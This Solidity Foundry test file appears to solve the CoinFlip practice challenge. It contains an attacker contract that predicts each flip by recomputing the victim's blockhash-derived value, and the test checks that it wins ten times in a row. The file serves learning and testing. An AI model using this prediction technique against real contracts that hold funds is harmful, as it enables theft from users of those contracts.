//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {CoinFlip} from "../src/CoinFlip.sol";



/********************** TEST CONTRACT**********************/
contract CoinFlipTest is Test {

        CoinFlip public coinFlip;
        address public attacker = address(0x1234);

        function setUp() public {
                coinFlip = new CoinFlip();

                //fund the attacker
                vm.deal(attacker, 1 ether);
        }


        function testCoinFlipExploit() public {

        vm.startPrank(attacker);

        // ===== PHASE 1: Deploy attacker contract =====
        CoinflipAttacker attackerContract = new CoinflipAttacker(address(coinFlip));

        // ===== PHASE 2:Execute 10 consecutive attacks =====
        for(uint256 i =0; i<10; i++){
                vm.roll(block.number + 1); // Roll the block number to get a new block hash

                //Execute the attack
                attackerContract.attack();
        }

         // ===== PHASE 3: Verify exploit success =====
         uint256 consecutiveWins = coinFlip.consecutiveWins();

         assertEq(consecutiveWins, 10 , "Attacker should have 10 consicutive wins");

         vm.stopPrank();

        }

}

/********************** ATTACKER CONTRACT**********************/
contract CoinflipAttacker {
        CoinFlip public  victim;
        uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        constructor (address _victim){
                victim = CoinFlip(_victim);
        }

        function attack() public  {
                //use same calculation as in the flip function
                uint256 blockValue = uint256(blockhash(block.number -1));

                bool side  = (blockValue / FACTOR) == 1 ? true : false;

                victim.flip(side);
        }
}

